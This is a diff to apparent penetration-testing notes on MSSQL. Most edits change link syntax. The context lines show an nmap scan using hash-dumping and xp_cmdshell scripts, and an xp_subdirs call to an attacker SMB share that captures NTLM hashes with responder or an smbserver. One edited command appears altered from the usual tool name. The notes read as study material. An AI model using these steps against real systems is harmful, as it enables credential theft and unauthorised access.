@@ -40,7 +40,7 @@ Example 1: Using nmap and mssql scripts
    sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
 
 Example 2:
-`Using the Metasploit Framework <Using the Metasploit Framework>`__
+:ref:`Using the Metasploit Framework <Using the Metasploit Framework>`
 auxiliary scanner called mssql_ping
 
 .. code-block:: console
@@ -144,7 +144,7 @@ OR
    1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
    2> GO
 
-And have `responder <responder>`__ running to catch the hash
+And have :ref:`responder <responder>` running to catch the hash
 
 .. code-block:: console
 
@@ -152,11 +152,11 @@ And have `responder <responder>`__ running to catch the hash
 
 OR
 
-Catch it with `impacket-smbserver <impacket-smbserver>`__
+Catch it with :ref:`impacket` smbserver
 
 .. code-block:: console
 
-   sudo impacket-smbserver share ./ -smb2support
+   sudo impacket smb share ./ -smb2support
 
 MSSQL Impersonating users to escalate privs
 *********************************************
